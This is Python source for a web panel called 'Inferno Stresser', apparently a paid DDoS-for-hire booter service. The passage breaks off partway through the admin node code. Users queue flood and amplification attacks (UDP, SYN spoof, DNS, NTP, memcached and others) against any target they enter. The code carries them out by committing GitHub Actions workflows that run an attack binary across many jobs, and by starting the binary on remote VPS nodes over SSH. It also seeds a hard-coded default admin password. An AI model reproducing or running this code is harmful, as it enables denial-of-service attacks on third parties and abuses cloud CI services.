#!/usr/bin/env python3
"""
Inferno Stresser - Complete Web Panel with Ultimate Binary Support
Methods: udp, syn, tcp, http, icmp, dns, ntp, memcached, ssdp, snmp, chargen, mixed
Modes: default, max-pps, max-bandwidth, both
"""
import os
import socket
import random
import time
import threading
import secrets
import paramiko
import json
import io
import certifi
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template_string, request, redirect, url_for, flash, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
from werkzeug.security import generate_password_hash, check_password_hash
from flask_sqlalchemy import SQLAlchemy
from github import Github, GithubException

# ==================== FLASK APP INIT ====================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB

os.makedirs(os.path.join(app.root_path, 'keys'), exist_ok=True)
os.makedirs(os.path.join(app.root_path, 'backups'), exist_ok=True)

# ==================== GLOBAL CONFIG ====================
MAINTENANCE_MODE = False
GLOBAL_COOLDOWN = 30
MAX_ATTACK_DURATION = 300
DEFAULT_THREADS = 2500
MAX_THREADS_LIMIT = 10000

# ==================== ATTACK METHODS ====================
ATTACK_METHODS = [
    ('udp', '🔥 UDP Flood (Amplification)'),
    ('syn', '⚡ SYN Spoof (Root Required)'),
    ('tcp', '🌐 TCP Connect Flood'),
    ('http', '💻 HTTP GET/POST Flood'),
    ('icmp', '📡 ICMP Echo Flood (Root Required)'),
    ('dns', '🔍 DNS Amplification'),
    ('ntp', '⏰ NTP Amplification'),
    ('memcached', '💾 Memcached Amplification'),
    ('ssdp', '📺 SSDP Reflection'),
    ('snmp', '📊 SNMP Reflection'),
    ('chargen', '📝 CHARGEN Reflection'),
    ('mixed', '🌀 Mixed (UDP+TCP+HTTP)'),
]

# ==================== PLAN DEFINITIONS ====================
PLANS = [
    {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'threads': 1500, 'key_prefix': 'FREE'},
    {'name': 'Pro Plan', 'price': '₹399/month', 'concurrent': 1, 'duration': 120, 'threads': 3000, 'key_prefix': 'PRO'},
    {'name': 'Enterprise Plan', 'price': '₹999/month', 'concurrent': 5, 'duration': 300, 'threads': 5000, 'key_prefix': 'ENT'},
    {'name': 'Ultimate Plan', 'price': '₹2499/month', 'concurrent': 10, 'duration': 600, 'threads': 10000, 'key_prefix': 'ULT'}
]

# ==================== ATTACK QUEUE ====================
attack_lock = threading.Lock()
attack_queue = []
is_attacking = False
current_attack = None

# ==================== DATABASE SETUP ====================
USE_MONGO = False
MONGO_URL = os.environ.get("MONGO_URL")
if MONGO_URL:
    try:
        mongo_client = MongoClient(
            MONGO_URL,
            serverSelectionTimeoutMS=10000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000,
            tls=True,
            tlsCAFile=certifi.where()
        )
        mongo_client.admin.command('ping')
        db = mongo_client['stresser_db']
        USE_MONGO = True
        print("✅ MongoDB connected")

        users_col = db['users']
        api_keys_col = db['api_keys']
        attack_logs_col = db['attack_logs']
        attack_nodes_col = db['attack_nodes']
        admin_users_col = db['admin_users']
        generated_keys_col = db['generated_keys']

        for coll in ['users', 'api_keys', 'attack_logs', 'attack_nodes', 'admin_users', 'generated_keys']:
            if coll not in db.list_collection_names():
                db.create_collection(coll)

        admin_users_col.update_many(
            {"is_super": {"$exists": False}},
            {"$set": {"is_super": True, "permissions": []}}
        )

        if admin_users_col.count_documents({}) == 0:
            admin_users_col.insert_one({
                "username": "admin",
                "password_hash": generate_password_hash("admin123"),
                "permissions": [],
                "is_super": True,
                "created_at": datetime.utcnow()
            })
            print("Default super admin created (admin / admin123)")

    except Exception as e:
        print(f"❌ MongoDB error: {e} – falling back to SQLite")
        USE_MONGO = False
else:
    print("⚠️ MONGO_URL not set – using SQLite")

if USE_MONGO:
    pass
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///stresser.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    db_sql = SQLAlchemy(app)

    class User(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        token = db_sql.Column(db_sql.String(128), unique=True, nullable=False)
        plan = db_sql.Column(db_sql.String(50), default="Free Plan")
        max_concurrent = db_sql.Column(db_sql.Integer, default=1)
        max_duration = db_sql.Column(db_sql.Integer, default=60)
        max_threads = db_sql.Column(db_sql.Integer, default=1500)
        slots_used = db_sql.Column(db_sql.Integer, default=0)
        total_attacks = db_sql.Column(db_sql.Integer, default=0)
        role = db_sql.Column(db_sql.String(20), default="user")
        expiry = db_sql.Column(db_sql.DateTime, nullable=True)
        added_by = db_sql.Column(db_sql.Integer, nullable=True)
        last_attack = db_sql.Column(db_sql.DateTime, nullable=True)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class ApiKey(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
        name = db_sql.Column(db_sql.String(100), default="Default")
        plan_name = db_sql.Column(db_sql.String(50), nullable=True)
        max_concurrent = db_sql.Column(db_sql.Integer, nullable=True)
        max_duration = db_sql.Column(db_sql.Integer, nullable=True)
        max_threads = db_sql.Column(db_sql.Integer, nullable=True)
        expires_at = db_sql.Column(db_sql.DateTime, nullable=True)
        active = db_sql.Column(db_sql.Boolean, default=True)
        last_used = db_sql.Column(db_sql.DateTime, nullable=True)
        total_attacks = db_sql.Column(db_sql.Integer, default=0)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackLog(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        target = db_sql.Column(db_sql.String(100))
        port = db_sql.Column(db_sql.Integer)
        duration = db_sql.Column(db_sql.Integer)
        method = db_sql.Column(db_sql.String(20), default="udp")
        mode = db_sql.Column(db_sql.String(20), default="default")
        threads = db_sql.Column(db_sql.Integer, default=1500)
        concurrent = db_sql.Column(db_sql.Integer, default=1)
        github_nodes_used = db_sql.Column(db_sql.Integer, default=0)
        vps_nodes_used = db_sql.Column(db_sql.Integer, default=0)
        status = db_sql.Column(db_sql.String(20), default='completed')
        timestamp = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackNode(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        name = db_sql.Column(db_sql.String(100), nullable=False)
        node_type = db_sql.Column(db_sql.String(20), nullable=False)
        enabled = db_sql.Column(db_sql.Boolean, default=True)
        github_token = db_sql.Column(db_sql.String(200), nullable=True)
        github_repo = db_sql.Column(db_sql.String(200), nullable=True)
        github_username = db_sql.Column(db_sql.String(100), nullable=True)
        github_status = db_sql.Column(db_sql.String(50), default="unknown")
        vps_host = db_sql.Column(db_sql.String(100), nullable=True)
        vps_port = db_sql.Column(db_sql.Integer, default=22)
        vps_username = db_sql.Column(db_sql.String(100), nullable=True)
        vps_password = db_sql.Column(db_sql.String(200), nullable=True)
        vps_key_path = db_sql.Column(db_sql.String(200), nullable=True)
        last_status = db_sql.Column(db_sql.String(50), default="unknown")
        status_detail = db_sql.Column(db_sql.String(50), default="unknown")
        binary_present = db_sql.Column(db_sql.Boolean, default=False)
        workflow_tested = db_sql.Column(db_sql.Boolean, default=False)
        attack_count = db_sql.Column(db_sql.Integer, default=0)
        last_used = db_sql.Column(db_sql.DateTime, nullable=True)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AdminUser(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        username = db_sql.Column(db_sql.String(80), unique=True, nullable=False)
        password_hash = db_sql.Column(db_sql.String(200), nullable=False)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)
        permissions = db_sql.Column(db_sql.Text, default="[]")
        is_super = db_sql.Column(db_sql.Boolean, default=False)

    class GeneratedKey(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
        plan = db_sql.Column(db_sql.String(50), default="Pro Plan")
        duration_days = db_sql.Column(db_sql.Integer, default=30)
        created_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)
        used_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'), nullable=True)
        used_at = db_sql.Column(db_sql.DateTime, nullable=True)
        active = db_sql.Column(db_sql.Boolean, default=True)

    with app.app_context():
        db_sql.create_all()
        if not User.query.first():
            default_token = secrets.token_urlsafe(32)
            user = User(token=default_token, plan="Free Plan", max_concurrent=1, max_duration=60, max_threads=1500, role="user")
            db_sql.session.add(user)
            db_sql.session.commit()
            print(f"SQLite: default user token: {default_token}")

# ==================== HELPER FUNCTIONS ====================
def generate_captcha():
    a = random.randint(1, 10)
    b = random.randint(1, 10)
    op = random.choice(['+', '-'])
    if op == '+':
        return f"{a} + {b} = ?", a + b
    else:
        if a < b:
            a, b = b, a
        return f"{a} - {b} = ?", a - b

def generate_token():
    return secrets.token_urlsafe(32)

def get_user_by_token(token):
    if USE_MONGO:
        return users_col.find_one({"token": token})
    else:
        return User.query.filter_by(token=token).first()

def admin_required(permission=None):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('admin_logged_in'):
                flash('Please login as admin first', 'danger')
                return redirect(url_for('admin_login'))
            if permission:
                admin_perms = session.get('admin_permissions', [])
                is_super = session.get('admin_is_super', False)
                if not is_super and permission not in admin_perms:
                    flash('You do not have permission to access this page.', 'danger')
                    return redirect(url_for('admin_dashboard'))
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def can_user_attack(user):
    role = user.get('role') if USE_MONGO else user.role
    if role == 'admin':
        return True, 0
    last = user.get('last_attack') if USE_MONGO else user.last_attack
    if last:
        elapsed = (datetime.utcnow() - last).total_seconds()
        if elapsed < GLOBAL_COOLDOWN:
            return False, GLOBAL_COOLDOWN - elapsed
    return True, 0

def process_attack_queue():
    global is_attacking, current_attack
    while True:
        with attack_lock:
            if not attack_queue:
                is_attacking = False
                current_attack = None
                break
            params = attack_queue.pop(0)
            current_attack = params
        try:
            run_attack(params)
        except Exception as e:
            print(f"Attack error: {e}")
        time.sleep(1)

def build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit):
    flags = []
    if mode == 'max-pps':
        flags.append('--max-pps')
    elif mode == 'max-bandwidth':
        flags.append('--max-bandwidth')
    elif mode == 'both':
        flags.append('--max-pps')
        flags.append('--max-bandwidth')
    if random_ports:
        flags.append('--random-ports')
    if random_delay:
        flags.append('--random-delay')
    if spoof:
        flags.append('--spoof')
    if flood:
        flags.append('--flood')
    if pps_limit > 0:
        flags.append(f'--pps-limit {pps_limit}')
    return ' '.join(flags)

def run_attack(params):
    user_id = params['user_id']
    target = params['target']
    port = params['port']
    duration = params['duration']
    method = params.get('method', 'udp')
    mode = params.get('mode', 'default')
    threads = params.get('threads', DEFAULT_THREADS)
    concurrent = params.get('concurrent', 1)
    random_ports = params.get('random_ports', 0)
    random_delay = params.get('random_delay', 0)
    spoof = params.get('spoof', 0)
    flood = params.get('flood', 0)
    pps_limit = params.get('pps_limit', 0)

    if USE_MONGO:
        github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
        vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
    else:
        github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
        vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()

    github_success = 0
    vps_success = 0

    for node in github_nodes:
        if trigger_github_attack(node, target, port, duration, method, threads, mode,
                                 random_ports, random_delay, spoof, flood, pps_limit):
            github_success += 1

    for node in vps_nodes:
        if trigger_vps_attack(node, target, port, duration, method, threads, mode,
                              random_ports, random_delay, spoof, flood, pps_limit):
            vps_success += 1

    if USE_MONGO:
        attack_logs_col.insert_one({
            "user_id": user_id, "target": target, "port": port, "duration": duration,
            "method": method, "mode": mode, "threads": threads, "concurrent": concurrent,
            "github_nodes_used": github_success, "vps_nodes_used": vps_success,
            "status": "completed", "timestamp": datetime.utcnow()
        })
        users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -concurrent}})
    else:
        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method, mode=mode,
                        threads=threads, concurrent=concurrent, github_nodes_used=github_success,
                        vps_nodes_used=vps_success, status='completed')
        db_sql.session.add(log)
        user = User.query.get(user_id)
        if user:
            user.total_attacks += 1
            user.slots_used = max(0, user.slots_used - concurrent)
        db_sql.session.commit()

def trigger_github_attack(node, target, port, duration, method, threads, mode,
                          random_ports, random_delay, spoof, flood, pps_limit):
    token = node['github_token'] if USE_MONGO else node.github_token
    repo_name = node['github_repo'] if USE_MONGO else node.github_repo
    matrix_size = 10
    matrix_list = ','.join(str(i) for i in range(1, matrix_size + 1))

    flags_str = build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit)

    yml_content = f"""name: Inferno Attack
on: [push]

jobs:
  stage-0-init:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x ultimate
      - run: ./ultimate {method} {target} {port} 10 {threads} {flags_str}

  stage-1-main:
    needs: stage-0-init
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x ultimate
      - run: ./ultimate {method} {target} {port} {duration} {threads} {flags_str}

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
    steps:
      - id: calc
        run: |
          NUM_JOBS=$(({duration} / 10))
          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0-init, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x ultimate
      - run: ./ultimate {method} {target} {port} 10 {threads} {flags_str}

  stage-3-cleanup:
    needs: [stage-1-main, stage-2-sequential]
    runs-on: ubuntu-22.04
    if: always()
    steps:
      - run: echo "Attack completed on $(date)"
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            contents = repo.get_contents(".github/workflows/main.yml")
            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
        except:
            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$inc": {"attack_count": 1}, "$set": {"last_used": datetime.utcnow(), "workflow_tested": True}})
        else:
            node.attack_count += 1
            node.last_used = datetime.utcnow()
            node.workflow_tested = True
            db_sql.session.commit()
        return True
    except Exception as e:
        print(f"GitHub error: {e}")
        return False

def trigger_vps_attack(node, target, port, duration, method, threads, mode,
                       random_ports, random_delay, spoof, flood, pps_limit):
    host = node['vps_host'] if USE_MONGO else node.vps_host
    ssh_port = node['vps_port'] if USE_MONGO else node.vps_port
    username = node['vps_username'] if USE_MONGO else node.vps_username
    password = node.get('vps_password') if USE_MONGO else node.vps_password
    key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=ssh_port, username=username, key_filename=key_path, timeout=10)
        elif password:
            ssh.connect(host, port=ssh_port, username=username, password=password, timeout=10)
        else:
            return False

        stdin, stdout, stderr = ssh.exec_command("whoami")
        user = stdout.read().decode().strip()
        if user == "root":
            binary_path = "/root/ultimate"
            work_dir = "/root"
        else:
            binary_path = f"/home/{user}/ultimate"
            work_dir = f"/home/{user}"

        flags_str = build_flags(mode, random_ports, random_delay, spoof, flood, pps_limit)

        ssh.exec_command("pkill -f ultimate; sleep 1")
        cmd = f"cd {work_dir} && nohup {binary_path} {method} {target} {port} {duration} {threads} {flags_str} > /dev/null 2>&1 &"
        ssh.exec_command(cmd)
        ssh.close()

        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$inc": {"attack_count": 1}, "$set": {"last_used": datetime.utcnow()}})
        else:
            node.attack_count += 1
            node.last_used = datetime.utcnow()
            db_sql.session.commit()
        return True
    except Exception as e:
        print(f"VPS error: {e}")
        return False

# ==================== NODE TESTING FUNCTIONS ====================
def test_github_node_detailed(node):
    token = node['github_token'] if USE_MONGO else node.github_token
    repo_name = node['github_repo'] if USE_MONGO else node.github_repo
    result = {'status': 'unknown', 'message': '', 'binary_present': False, 'workflow_ok': False}
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            repo.get_contents("ultimate")
            result['binary_present'] = True
        except:
            pass
        try:
            repo.get_contents(".github/workflows/main.yml")
            result['workflow_ok'] = True
        except:
            pass
        result['status'] = 'active'
        result['message'] = f"OK (Binary: {'✓' if result['binary_present'] else '✗'}, WF: {'✓' if result['workflow_ok'] else '✗'})"
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {
                "last_status": "online", "status_detail": "active",
                "binary_present": result['binary_present'], "workflow_tested": result['workflow_ok'],
                "github_status": "active"}})
        else:
            node.last_status = "online"
            node.status_detail = "active"
            node.binary_present = result['binary_present']
            node.workflow_tested = result['workflow_ok']
            node.github_status = "active"
            db_sql.session.commit()
    except Exception as e:
        result['status'] = 'dead'
        result['message'] = str(e)
    return result

def test_vps_node_detailed(node):
    host = node['vps_host'] if USE_MONGO else node.vps_host
    port = node['vps_port'] if USE_MONGO else node.vps_port
    username = node['vps_username'] if USE_MONGO else node.vps_username
    password = node.get('vps_password') if USE_MONGO else node.vps_password
    key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path
    result = {'status': 'unknown', 'message': '', 'binary_present': False}
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=port, username=username, key_filename=key_path, timeout=5)
        elif password:
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
        else:
            result['status'] = 'dead'
            result['message'] = 'No auth method'
            return result
        stdin, stdout, stderr = ssh.exec_command("whoami")
        user = stdout.read().decode().strip()
        if user == "root":
            check_cmd = "test -f /root/ultimate && echo 'exists'"
        else:
            check_cmd = f"test -f /home/{user}/ultimate && echo 'exists'"
        stdin, stdout, stderr = ssh.exec_command(check_cmd)
        output = stdout.read().decode().strip()
        ssh.close()
        result['binary_present'] = (output == 'exists')
        result['status'] = 'active' if result['binary_present'] else 'no_binary'
        result['message'] = 'OK (Binary found)' if result['binary_present'] else 'Connected but no binary'
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {
                "last_status": "online", "status_detail": result['status'],
                "binary_present": result['binary_present']}})
        else:
            node.last_status = "online"
            node.status_detail = result['status']
            node.binary_present = result['binary_present']
            db_sql.session.commit()
    except Exception as e:
        result['status'] = 'dead'
        result['message'] = str(e)
    return result
    
# ==================== USER ROUTES ====================
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        token = request.form.get('token')
        captcha_answer = request.form.get('captcha')
        if not captcha_answer or str(captcha_answer) != str(session.get('captcha_answer')):
            flash('Invalid captcha', 'danger')
        else:
            user = get_user_by_token(token)
            if user:
                session['user_token'] = token
                session['user_id'] = str(user['_id']) if USE_MONGO else user.id
                session['user_role'] = user.get('role', 'user') if USE_MONGO else user.role
                flash('Logged in', 'success')
                return redirect(url_for('dashboard'))
            flash('Invalid token', 'danger')
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(LOGIN_HTML, captcha_question=q)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        captcha_answer = request.form.get('captcha')
        if not captcha_answer or str(captcha_answer) != str(session.get('captcha_answer')):
            flash('Invalid captcha', 'danger')
        else:
            token = generate_token()
            if USE_MONGO:
                users_col.insert_one({
                    "token": token, "plan": "Free Plan", "max_concurrent": 1, "max_duration": 60,
                    "max_threads": 1500, "slots_used": 0, "total_attacks": 0, "role": "user",
                    "created_at": datetime.utcnow()
                })
            else:
                user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60, max_threads=1500, role="user")
                db_sql.session.add(user)
                db_sql.session.commit()
            flash(f'Your access token: {token}', 'success')
            return redirect(url_for('login'))
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(REGISTER_HTML, captcha_question=q)

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
        attacks = list(attack_logs_col.find({"user_id": session['user_id']}).sort("timestamp", -1).limit(10))
        slots_used = user.get('slots_used', 0)
        max_slots = user.get('max_concurrent', 1)
    else:
        user = User.query.get(session['user_id'])
        attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
        slots_used = user.slots_used
        max_slots = user.max_concurrent
    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks, slots_used=slots_used, max_slots=max_slots)

@app.route('/attack', methods=['GET', 'POST'])
def attack_page():
    global is_attacking
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if MAINTENANCE_MODE and session.get('user_role') != 'admin':
        flash('Maintenance mode - attacks disabled', 'warning')
        return redirect(url_for('dashboard'))

    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])

    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'udp')
        mode = request.form.get('mode', 'default')
        threads = int(request.form.get('threads', DEFAULT_THREADS))
        concurrent = int(request.form.get('concurrent', 1))
        random_ports = 1 if request.form.get('random_ports') else 0
        random_delay = 1 if request.form.get('random_delay') else 0
        spoof = 1 if request.form.get('spoof') else 0
        flood = 1 if request.form.get('flood') else 0
        pps_limit = int(request.form.get('pps_limit', 0))

        max_dur = user.get('max_duration', 60) if USE_MONGO else user.max_duration
        max_threads = user.get('max_threads', 1500) if USE_MONGO else user.max_threads
        max_conc = user.get('max_concurrent', 1) if USE_MONGO else user.max_concurrent

        if session.get('user_role') == 'admin':
            max_dur = 999999
            max_threads = MAX_THREADS_LIMIT
            max_conc = 999999

        if duration > max_dur:
            flash(f'Max duration {max_dur}s', 'danger')
            return redirect(url_for('attack_page'))
        if threads > max_threads:
            flash(f'Max threads {max_threads}', 'danger')
            return redirect(url_for('attack_page'))
        if concurrent > max_conc:
            flash(f'Max concurrent {max_conc}', 'danger')
            return redirect(url_for('attack_page'))

        slots_used = user.get('slots_used', 0) if USE_MONGO else user.slots_used
        if slots_used + concurrent > max_conc:
            flash('No free slots', 'danger')
            return redirect(url_for('attack_page'))

        can, remaining = can_user_attack(user)
        if not can:
            flash(f'Cooldown: {remaining:.0f}s', 'danger')
            return redirect(url_for('attack_page'))

        with attack_lock:
            attack_queue.append({
                'user_id': ObjectId(session['user_id']) if USE_MONGO else session['user_id'],
                'target': target, 'port': port, 'duration': duration,
                'method': method, 'mode': mode, 'threads': threads, 'concurrent': concurrent,
                'random_ports': random_ports, 'random_delay': random_delay,
                'spoof': spoof, 'flood': flood, 'pps_limit': pps_limit,
                'source': 'web'
            })
            if not is_attacking:
                is_attacking = True
                threading.Thread(target=process_attack_queue).start()

        if USE_MONGO:
            users_col.update_one(
                {"_id": ObjectId(session['user_id'])},
                {"$set": {"last_attack": datetime.utcnow()}, "$inc": {"slots_used": concurrent}}
            )
        else:
            user.last_attack = datetime.utcnow()
            user.slots_used += concurrent
            db_sql.session.commit()

        flash('Attack queued', 'success')
        return redirect(url_for('attack_page'))

    return render_template_string(ATTACK_HTML, user=user, methods=ATTACK_METHODS)

@app.route('/products')
def products_page():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])
    return render_template_string(PRODUCTS_HTML, user=user, plans=PLANS)

@app.route('/redeem', methods=['GET', 'POST'])
def redeem_key():
    if request.method == 'POST':
        key_str = request.form.get('key', '').strip().upper()
        if USE_MONGO:
            key = generated_keys_col.find_one({"key": key_str, "active": True, "used_by": None})
        else:
            key = GeneratedKey.query.filter_by(key=key_str, active=True, used_by=None).first()
        if not key:
            flash('Invalid or already used key', 'danger')
            return redirect(url_for('dashboard'))

        days = key['duration_days'] if USE_MONGO else key.duration_days
        plan_name = key.get('plan', 'Pro Plan') if USE_MONGO else key.plan
        plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])

        if 'user_id' in session:
            if USE_MONGO:
                users_col.update_one(
                    {"_id": ObjectId(session['user_id'])},
                    {"$set": {
                        "plan": plan_name,
                        "max_concurrent": plan['concurrent'],
                        "max_duration": plan['duration'],
                        "max_threads": plan['threads'],
                        "expiry": datetime.utcnow() + timedelta(days=days),
                        "role": "user"
                    }}
                )
            else:
                user = User.query.get(session['user_id'])
                user.plan = plan_name
                user.max_concurrent = plan['concurrent']
                user.max_duration = plan['duration']
                user.max_threads = plan['threads']
                user.expiry = datetime.utcnow() + timedelta(days=days)
                user.role = 'user'
                db_sql.session.commit()
        else:
            token = generate_token()
            expiry = datetime.utcnow() + timedelta(days=days)
            if USE_MONGO:
                user_id = users_col.insert_one({
                    "token": token,
                    "plan": plan_name,
                    "max_concurrent": plan['concurrent'],
                    "max_duration": plan['duration'],
                    "max_threads": plan['threads'],
                    "role": "user",
                    "expiry": expiry,
                    "created_at": datetime.utcnow()
                }).inserted_id
            else:
                user = User(
                    token=token,
                    plan=plan_name,
                    max_concurrent=plan['concurrent'],
                    max_duration=plan['duration'],
                    max_threads=plan['threads'],
                    role="user",
                    expiry=expiry
                )
                db_sql.session.add(user)
                db_sql.session.commit()
                user_id = user.id
            session['user_token'] = token
            session['user_id'] = str(user_id) if USE_MONGO else user_id
            session['user_role'] = 'user'

        if USE_MONGO:
            generated_keys_col.update_one({"_id": key['_id']}, {"$set": {"used_by": session['user_id'], "used_at": datetime.utcnow(), "active": False}})
        else:
            key.used_by = session['user_id']
            key.used_at = datetime.utcnow()
            key.active = False
            db_sql.session.commit()

        flash(f'Key redeemed! Your plan is now {plan_name}.', 'success')
        return redirect(url_for('dashboard'))

    return render_template_string(REDEEM_HTML)

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out', 'success')
    return redirect(url_for('login'))

# ==================== ADMIN ROUTES ====================
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if USE_MONGO:
            admin = admin_users_col.find_one({"username": username})
            if admin and check_password_hash(admin['password_hash'], password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                session['admin_id'] = str(admin['_id'])
                session['admin_permissions'] = admin.get('permissions', [])
                session['admin_is_super'] = admin.get('is_super', False)
                flash('Welcome!', 'success')
                return redirect(url_for('admin_dashboard'))
        else:
            admin = AdminUser.query.filter_by(username=username).first()
            if admin and check_password_hash(admin.password_hash, password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                session['admin_id'] = admin.id
                session['admin_permissions'] = json.loads(admin.permissions) if admin.permissions else []
                session['admin_is_super'] = admin.is_super
                flash('Welcome!', 'success')
                return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'danger')
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
@admin_required('dashboard')
def admin_dashboard():
    if USE_MONGO:
        total_users = users_col.count_documents({})
        total_attacks = attack_logs_col.count_documents({})
        total_nodes = attack_nodes_col.count_documents({})
        active_nodes = attack_nodes_col.count_documents({"enabled": True, "status_detail": "active"})
        total_keys = generated_keys_col.count_documents({})
    else:
        total_users = User.query.count()
        total_attacks = AttackLog.query.count()
        total_nodes = AttackNode.query.count()
        active_nodes = AttackNode.query.filter_by(enabled=True, status_detail='active').count()
        total_keys = GeneratedKey.query.count()
    can_manage = session.get('admin_is_super', False) or 'manage_admins' in session.get('admin_permissions', [])
    return render_template_string(ADMIN_DASHBOARD_ENHANCED_HTML,
                                  total_users=total_users, total_attacks=total_attacks,
                                  total_nodes=total_nodes, active_nodes=active_nodes,
                                  total_keys=total_keys, can_manage_admins=can_manage)

@app.route('/admin/nodes')
@admin_required('nodes')
def admin_nodes():
    if USE_MONGO:
        nodes = list(attack_nodes_col.find())
    else:
        nodes = AttackNode.query.all()
    return render_template_string(ADMIN_NODES_HTML, nodes=nodes, USE_MONGO=USE_MONGO)

@app.route('/admin/nodes/add_github', methods=['POST'])
@admin_required('nodes')
def admin_add_github_node():
    name = request.form.get('name')
    token = request.form.get('github_token')
    repo_name = request.form.get('github_repo', 'InfernoCore')
    enabled = request.form.get('enabled') == 'on'
    if not name or not token:
        flash('Name and token required', 'danger')
        return redirect(url_for('admin_nodes'))
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = g.get_repo(f"{user.login}/{repo_name}")
            created = False
